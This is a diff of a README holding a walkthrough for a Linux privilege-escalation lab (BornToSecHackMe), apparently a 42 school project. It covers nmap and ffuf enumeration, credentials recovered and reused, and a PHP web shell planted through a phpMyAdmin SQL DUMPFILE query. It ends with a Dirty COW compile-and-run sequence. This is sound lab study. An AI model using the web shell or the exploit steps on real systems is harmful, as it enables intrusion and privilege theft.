@@ -5,132 +5,286 @@
 - [Info](#info)
 - [Writeups](#writeups)
     - [Writeup 1](#writeup-1)
+        - [Emun](#enum)
+        - [Forum](#forum)
+        - [Webmail](#webmail)
+        - [Phpmyadmin](#phpmyadmin)
         - [lmezard](#lmezard)
         - [laurie](#laurie)
         - [thor](#thor)
         - [zaz](#zaz)
-    - [Writeup 2](#writeup-1)
-    - [Writeup 3](#writeup-1)
-    - [Writeup 4](#writeup-1)
-    - [Writeup 5](#writeup-1)
-
+    - [Writeup 2](#writeup-2)
+- [Parrot](#parrot)
 
 ## Info
 
 Project about multiple privilege escalations on Linux.
 
 - Status: finished
-- Result: 125%
+- Result: 100%
 - Observations: NULL
 
 ## Writeups
 
 ### Writeup 1
 
-We try to launch the ISO an a VM but it asks for user and password, but the
-subject did not provide one.
+#### Enum
 
-Let's inspect the ISO squashfs
-(squashfs is a compressed read-only file system for Linux):
+At first I found the password by exploiting the ISO, but I later found out
+that's cheating, and we cannot exploit the ISO or grub, so here's an alternative
+method.
+
+Since the vm in is vbox I know the ip, but let's do this anyway, let's
+suppose I don't know the ip. Create a `host-only` adapter for the machine,
+so we can interact with it, and run `ifconfig`, search for the `vbox` adapter:
 ```bash
-tar -xf BornToSecHackMe-v1.1.iso
-
-# 42 mac is shit so I can't install squashfs-tools, so instead I created a
-# docker image on the `./scripts` dir
-cd ./scripts
-docker build -t my-squashfs-tools:latest .
-docker run -v /Volumes/PortableSSD/42/casper:/dev/shm -it my-squashfs-tools:latest
+vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
+	ether 0a:00:27:00:00:00
+	inet 192.168.56.1 netmask 0xffffff00 broadcast 192.168.56.255
 ```
 
-In the container run `unsquashfs`:
+Now, let's do some host discovery in the entire network with ICMP Echo
+and `nmap`:
 ```bash
-cd /dev/shm
-unsquashfs filesystem.squashfs
+# -PE: ICMP echo
+# -sn: ping scan (disable port scan)
+# /24: to scan the entire subnet
+nmap -PE -sn 192.168.56.1/24
+
+# Results
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 18:10 UTC
+Nmap scan report for 192.168.56.1
+Host is up (0.0032s latency).
+Nmap scan report for 192.168.56.100
+Host is up (0.0025s latency).
+Nmap scan report for 192.168.56.101
+Host is up (0.011s latency).
+Nmap done: 256 IP addresses (3 hosts up) scanned in 2.10 seconds
 ```
 
-A lot or errors will popup, ignore them, now let's see what's inside:
-```bash
-cd squashfs-root/
+Three hosts are up, the `192.168.56.1` is the vbox gateway, and the
+`192.168.56.100` is the vbox dhcpd (if I remeber correctly), so that leaves
+us with only one IP, that's the server IP: `192.168.56.101`.
 
-# Let's add `tree` to easily enumerate dirs
-apk add tree
-cd home && tree
+Let's run a full port scan on it:
+```bash
+# Split the scan in two phases (ports and scripts)
+ports=$(nmap -p- --min-rate 1000 -T4 -Pn 192.168.56.101 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sV -sC -Pn 192.168.56.101
+
+# Port results
+21,22,80,143,443,993
+
+# Scripts results
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 18:17 UTC
+Nmap scan report for 192.168.56.101
+Host is up (0.00063s latency).
+
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 2.0.8 or later
+|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
+22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
+|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
+|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
+80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Hack me if you can
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+143/tcp open  imap       Dovecot imapd
+|_imap-capabilities: ENABLE LOGIN-REFERRALS OK more STARTTLS ID LITERAL+ SASL-IR have post-login listed capabilities LOGINDISABLEDA0001 IDLE IMAP4rev1 Pre-login
+|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
+443/tcp open  ssl/http   Apache httpd 2.2.22
+|_http-title: 404 Not Found
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+| ssl-cert: Subject: commonName=BornToSec
+| Not valid before: 2015-10-08T00:19:46
+|_Not valid after:  2025-10-05T00:19:46
+|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
+993/tcp open  ssl/imaps?
+|_ssl-date: 2023-05-22T18:17:29+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2015-10-08T20:57:30
+|_Not valid after:  2025-10-07T20:57:30
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
 ```
 
-Results:
+The web title is `Hack me if you can`, so let's try.
+
+The web is not interesting, let's enumerate dirs quickly with `dirsearch`:
+```bash
+dirsearch -u 192.168.56.101
+
+# Results
+[18:41:55] 403 -  293B  - /.ht_wsr.txt
+[18:41:56] 403 -  296B  - /.htaccess.bak1
+[18:41:56] 403 -  298B  - /.htaccess.sample
+[18:41:56] 403 -  296B  - /.htaccess.save
+[18:41:56] 403 -  296B  - /.htaccess.orig
+[18:41:56] 403 -  296B  - /.htaccess_orig
+[18:41:56] 403 -  297B  - /.htaccess_extra
+[18:41:56] 403 -  294B  - /.htaccess_sc
+[18:41:56] 403 -  295B  - /.htaccessOLD2
+[18:41:56] 403 -  294B  - /.htaccessBAK
+[18:41:56] 403 -  287B  - /.html
+[18:41:56] 403 -  296B  - /.htpasswd_test
+[18:41:56] 403 -  286B  - /.htm
+[18:41:56] 403 -  293B  - /.httr-oauth
+[18:41:56] 403 -  292B  - /.htpasswds
+[18:41:56] 403 -  294B  - /.htaccessOLD
+[18:42:02] 403 -  290B  - /cgi-bin/
+[18:42:03] 403 -  290B  - /doc/api/
+[18:42:03] 403 -  301B  - /doc/en/changes.html
+[18:42:03] 403 -  301B  - /doc/html/index.html
+[18:42:03] 403 -  300B  - /doc/stable.version
+[18:42:03] 403 -  286B  - /doc/
+[18:42:04] 301 -  316B  - /fonts  ->  http://192.168.56.101/fonts/
+[18:42:04] 403 -  287B  - /forum
+[18:42:04] 403 -  288B  - /forum/
+[18:42:04] 403 -  294B  - /forum/admin/
+[18:42:04] 403 -  307B  - /forum/install/install.php
+[18:42:05] 200 -    1KB - /index.html
+[18:42:08] 403 -  295B  - /server-status
+[18:42:08] 403 -  296B  - /server-status/
+```
+
+`dirsearch` is just a quick tool to get started while `ffuf` launch a bigger
+attarck using `medium-2.3` wordlist (why? I used to compete for HTB first blood,
+so it's an habit now):
+```bash
+ffuf -t 30 -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://192.168.56.101/FUZZ
+
+# Results
+forum                   [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 0ms]
+fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
+server-status           [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 0ms]
+```
+```bash
+ffuf -t 30 -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u https://192.168.56.101/FUZZ
+
+# Results
+forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 3ms]
+webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 20ms]
+phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 298ms]
+server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 3ms]
+```
+
+#### Forum
+
+Let's start with the forum, we get a 403 using `http`, but we can access it via
+`https://192.168.56.101/forum`.
+
+Looking at the posts author we can extract some users `admin`, `lmezard`,
+`qudevide`, `zaz`, `wandre` and `thor`.
+
+The post `https://192.168.56.101/forum/index.php?id=6` from `lmezard` is
+interesting, it contains what seems like a `sys.log` or `auth.log` most likely.
+
+We find some valid users: `lmezard`, `root`, `admin`.
+
+And a invalid user, that seems like a password: `!q\]Ej?*5K5cy*AJ`.
+
+I login in the forum onto the user `lmezard` with it.
+
+Our account email is `laurie@borntosec.net `, interesting maybe.
+
+We can also go to the user area `https://192.168.56.101/forum/index.php?mode=user`,
+and send emails to each user, if we try to send an email to `admin`, we see
+its email is the same as us, not a surprise, since `lmezard` posted the `auth.log`,
+it was already clear it was the admin. The other users don't have an email.
+
+After further investigation there is nothing more in the forum, time to
+enumerate another service.
+
+#### Webmail
+
+I started with the `webmail` because we have an email and a password, and
+indeed, the `laurie@borntosec.net:!q\]Ej?*5K5cy*AJ` credentials worked.
+
+We have two emails, in one of them we find creds for the db: `root:Fg-'kKXBj87E:aJ$`.
+
+#### Phpmyadmin
+
+We connect to `https://192.168.56.101/phpmyadmin/` with them.
+
+Let's try to connect from the terminal with a client:
+```bash
+apt install default-mysql-client
+mysql -h 192.168.56.101 -u root -p"Fg-'kKXBj87E"':aJ$`'
+```
+
+But we fail, so let's find another way.
+
+I tried to upload a reverse shell via phpmyadmin `SQL` panel, which lets us
+run querys, but I struggle finding a dir, after some search I enumerate
+`https://192.168.56.101/forum` with `dirsearch` and found some dirs:
+- `images`.
+- `includes`
+- `js`
+- `lang`
+- `modules`
+- `themes`
+- `templates_c`
+- `update`
+
+And it worked on the `templates_c` dir:
+```sql
+SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/forum/templates_c/shell.php';
+```
+
+Now, we can access the webshell via: `https://192.168.56.101/forum/templates_c/shell.php`,
+and use it like so:
 ```raw
-.
-├── LOOKATME
-│   └── password
-├── ft_root
-│   ├── Desktop
-│   └── mail
-│       ├── INBOX.Drafts
-│       ├── INBOX.Sent
-│       └── INBOX.Trash
-├── laurie
-│   ├── README
-│   └── bomb
-├── laurie@borntosec.net
-│   └── mail
-│       ├── INBOX.Drafts
-│       ├── INBOX.Sent
-│       └── INBOX.Trash
-├── lmezard
-│   ├── README
-│   └── fun
-├── thor
-│   ├── README
-│   └── turtle
-└── zaz
-    ├── exploit_me
-    └── mail
-        ├── INBOX.Drafts
-        ├── INBOX.Sent
-        └── INBOX.Trash
+https://192.168.56.101/forum/templates_c/shell.php?cmd=id
 ```
 
-Inspecting the ISO on the host fs we found
+We see we're the `www-data` user, and after some enum we find a `LOOKATME` file
+on `/home`:
+```raw
+https://192.168.56.101/forum/templates_c/shell.php?cmd=ls%20/home
+# Results
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+```
 
-Inspecting the files we find that:
-- `LOOKATME`:
-    - Has a password file for `lmezard`, that's our foothold to the machine.
-- `ft_root`:
-    - Has a `Desktop` dir, but is empty.
-    - Note this users is not the real `root`.
-- `laurie`:
-    - Has a challange that will give us the `thor` user password.
-    - The challenge is a binary called `bomb`.
-- `lmezard`:
-    - Has a challenge that will give us the `laurie` user password.
-    - The challenge is a `tar` file full of `pcap`s.
-- `thor`:
-    - Has a challenge that will give us the `zaz` user password.
-    - The challenge is a text file `turtle` that is full of instructions (1471 lines).
-- `zaz`:
-    - Has a binary `exploit_me`, owned by root.
-- All the users have mailboxes, we will check them later.
+```raw
+https://192.168.56.101/forum/templates_c/shell.php?cmd=ls%20/home/LOOKATME
+# Results
+password
+```
 
-#### lmezard
-
-Login as `lmezard` with the provided password:
-```bash
-cat /dev/shm/squashfs-root/home/LOOKATME/password
+```raw
+https://192.168.56.101/forum/templates_c/shell.php?cmd=cat%20/home/LOOKATME/password
+# Results
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-We try to connect to the machine using `ssh` without success, login locally
-we check the `/etc/sshd_config` file and found out that `lmezard` is not allowed
-to login via `ssh`:
-```raw
-AllowUsers ft_root zaz thor laurie
+Oh! Credential!
+
+#### lmezard
+
+We can't login via `ssh`, we `ftp` is working (I needed to connect using
+passive mode: `-p`):
+```bash
+ftp -p 192.168.56.101
+Name: lmezard
+Password: G!@M6f4Eatau{sF"
+
+ftp> ?
+ftp> ls
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+ftp> get README
+ftp> get fun
+ftp> quit
 ```
 
-This is gonna be a headache, I'm a dvorak user and I don't remember
-the US layout... Hope `lmezard` challenge is easy and we can login as other
-user via `ssh` as soon as possible.
+The `README` says that we need to complete a "little" challenge, and we will
+be able to login as `laurie` via `ssh` with the result.
 
-Untar `fun` to other dir where we have perms:
+Untar `fun`:
 ```bash
 tar -xf fun -C /dev/shm
 cd /dev/shm/ft_fun
@@ -554,4 +708,19 @@ root
 
 ### Writeup 2
 
-`TODO`...
+Dirty COW, I doubt this is intended, it's probably just because of the years,
+but... Is vulnerable, take the `./scripts/dirtycow.c`, and just run:
+```bash
+gcc dirtycow.c -lpthread -lcrypt
+./a.out
+su firefart
+```
+
+We could also exploit `grub`, but the subjects do not let us do so.
+
+## Parrot
+
+I used the following docker most of the time:
+```bash
+docker run --rm -ti --network host -v $PWD:/host parrotsec/security
+```
